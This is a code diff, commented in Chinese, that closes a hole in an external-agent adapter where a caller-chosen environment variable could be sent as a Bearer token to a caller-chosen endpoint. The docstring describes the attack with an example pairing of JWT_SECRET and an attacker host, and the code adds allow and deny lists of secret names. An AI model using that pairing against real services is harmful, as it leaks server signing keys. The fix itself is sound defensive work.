@@ -2,8 +2,17 @@
 
 统一 Agent Adapter 接口 + 外部 Agent 注册中心。
 API Key 不落明文：存 env 引用名，运行时解析。
+
+## auth_env_var 的安全边界（修复「密钥外发」）
+
+`auth_env_var` 原本可以是**任意**环境变量名，而 adapter 会把其值当作
+`Authorization: Bearer` 发到同样由调用方指定的 `endpoint`。于是
+`auth_env_var=JWT_SECRET` + `endpoint=https://attacker.tld` 就能窃取
+JWT 签名密钥。现在改为固定允许列表（只认模型服务 key），并显式拒绝
+服务端敏感变量；旧数据在解析/执行时同样会被拦下，而不是只在注册时拦。
 """
 import enum
+import os
 import uuid
 from abc import ABC, abstractmethod
 from datetime import datetime, timezone
@@ -11,7 +20,84 @@ from datetime import datetime, timezone
 from sqlalchemy import JSON, Boolean, Enum, ForeignKey, String, Text
 from sqlalchemy.orm import Mapped, mapped_column
 
+from app.core.net_guard import validate_outbound_url_async
 from app.db.base import Base
+
+
+# 只允许引用这些「模型服务密钥」。新供应商接入时在此登记，
+# 不允许通过用户输入扩展——环境变量名本身就是攻击面。
+ALLOWED_AUTH_ENV_VARS = frozenset({
+    "OPENAI_API_KEY",
+    "OPENAI_COMPAT_API_KEY",
+    "AZURE_OPENAI_API_KEY",
+    "ANTHROPIC_API_KEY",
+    "GEMINI_API_KEY",
+    "GOOGLE_API_KEY",
+    "DASHSCOPE_API_KEY",
+    "DEEPSEEK_API_KEY",
+    "MOONSHOT_API_KEY",
+    "ZHIPU_API_KEY",
+    "MINIMAX_API_KEY",
+    "SILICONFLOW_API_KEY",
+    "OPENROUTER_API_KEY",
+    "GROQ_API_KEY",
+    "MISTRAL_API_KEY",
+    "XAI_API_KEY",
+    "TOGETHER_API_KEY",
+    "FIREWORKS_API_KEY",
+    "PERPLEXITY_API_KEY",
+    "COHERE_API_KEY",
+    "ARK_API_KEY",
+    "VOLCENGINE_API_KEY",
+})
+
+# 即使是模型服务也不该碰的服务端配置；双保险，避免未来有人在
+# 允许列表里误加（例如某个供应商的 key 恰好叫 *_SECRET）。
+FORBIDDEN_AUTH_ENV_NAMES = frozenset({
+    "JWT_SECRET",
+    "SECRET_KEY",
+    "DATABASE_URL",
+    "REDIS_URL",
+    "ENCRYPTION_KEY",
+    "PRIVATE_KEY",
+})
+_FORBIDDEN_SUFFIXES = ("_SECRET", "_PASSWORD")
+
+
+def is_forbidden_auth_env(name: str) -> bool:
+    upper = (name or "").strip().upper()
+    return (upper in FORBIDDEN_AUTH_ENV_NAMES
+            or upper.endswith(_FORBIDDEN_SUFFIXES))
+
+
+def validate_auth_env_var(name: str | None) -> str | None:
+    """校验 auth_env_var：只允许模型服务 key 的白名单。非法则抛 ValueError。"""
+    cleaned = (name or "").strip()
+    if not cleaned:
+        return None
+    upper = cleaned.upper()
+    if is_forbidden_auth_env(upper):
+        raise ValueError("该环境变量属于服务端敏感配置，禁止作为外部 Agent 密钥引用")
+    if upper not in ALLOWED_AUTH_ENV_VARS:
+        raise ValueError(
+            "auth_env_var 只允许引用模型服务密钥（如 OPENAI_API_KEY / "
+            "ANTHROPIC_API_KEY / GEMINI_API_KEY），其他变量名一律拒绝")
+    # 返回规范名（环境变量大小写敏感，但白名单统一大写；常见部署均为大写）
+    return upper
+
+
+def resolve_auth_env(name: str | None) -> str | None:
+    """按白名单解析密钥；非法名字抛 ValueError，取不到返回 None。"""
+    validated = validate_auth_env_var(name)
+    return os.environ.get(validated) if validated else None
+
+
+async def validated_endpoint(conn: "ExternalAgentConnection") -> str:
+    """校验并返回 endpoint（允许私网：本地 LLM；元数据地址仍拒绝）。"""
+    endpoint = (conn.endpoint or "").strip()
+    if not endpoint:
+        raise ValueError("endpoint 未配置")
+    return await validate_outbound_url_async(endpoint, allow_private=True)
 
 
 def _now():
@@ -82,10 +168,8 @@ class AgentAdapter(ABC):
         return self.conn.capabilities or []
 
     def _resolve_api_key(self) -> str | None:
-        import os
-        if not self.conn.auth_env_var:
-            return None
-        return os.environ.get(self.conn.auth_env_var)
+        # 不在白名单的环境变量在这里抛 ValueError（旧数据同样拦住）
+        return resolve_auth_env(self.conn.auth_env_var)
 
 
 class APIAgentAdapter(AgentAdapter):
@@ -93,13 +177,14 @@ class APIAgentAdapter(AgentAdapter):
 
     async def execute(self, task_input: str, config: dict | None = None) -> dict:
         import httpx
+        endpoint = await validated_endpoint(self.conn)
         headers = {}
         key = self._resolve_api_key()
         if key:
             headers["Authorization"] = f"Bearer {key}"
-        async with httpx.AsyncClient(timeout=60) as client:
+        async with httpx.AsyncClient(timeout=60, trust_env=False) as client:
             resp = await client.post(
-                f"{self.conn.endpoint}/chat/completions",
+                f"{endpoint}/chat/completions",
                 json={"messages": [{"role": "user", "content": task_input}],
                       **(config or {})},
                 headers=headers)
@@ -115,8 +200,10 @@ class APIAgentAdapter(AgentAdapter):
     async def test_connection(self) -> dict:
         import httpx
         try:
-            async with httpx.AsyncClient(timeout=10) as client:
-                resp = await client.get(self.conn.endpoint or "")
+            endpoint = await validated_endpoint(self.conn)
+            async with httpx.AsyncClient(timeout=10, trust_env=False,
+                                         follow_redirects=False) as client:
+                resp = await client.get(endpoint)
             return {"ok": True, "http": resp.status_code}
         except Exception as e:
             return {"ok": False, "error": str(e)[:150]}
@@ -140,8 +227,9 @@ class McpHttpAgentAdapter(AgentAdapter):
 
     async def execute(self, task_input: str, config: dict | None = None) -> dict:
         from app.api.routes.mcp import mcp_http_execute
+        endpoint = await validated_endpoint(self.conn)
         return await mcp_http_execute(
-            self.conn.endpoint or "", task_input, config,
+            endpoint, task_input, config,
             bearer=self._resolve_api_key())
 
     async def get_status(self) -> dict:
@@ -150,14 +238,16 @@ class McpHttpAgentAdapter(AgentAdapter):
     async def test_connection(self) -> dict:
         import httpx
         try:
+            endpoint = await validated_endpoint(self.conn)
             headers = {}
             key = self._resolve_api_key()
             if key:
                 headers["Authorization"] = f"Bearer {key}"
-            async with httpx.AsyncClient(timeout=10) as client:
-                r = await client.post(self.conn.endpoint or "", json={
+            async with httpx.AsyncClient(timeout=10, trust_env=False,
+                                         follow_redirects=False) as client:
+                r = await client.post(endpoint, json={
                     "jsonrpc": "2.0", "id": 1, "method": "initialize",
-                    "params": {}})
+                    "params": {}}, headers=headers)
                 return {"ok": r.status_code < 500, "http": r.status_code,
                         "provider": "mcp"}
         except Exception as e:
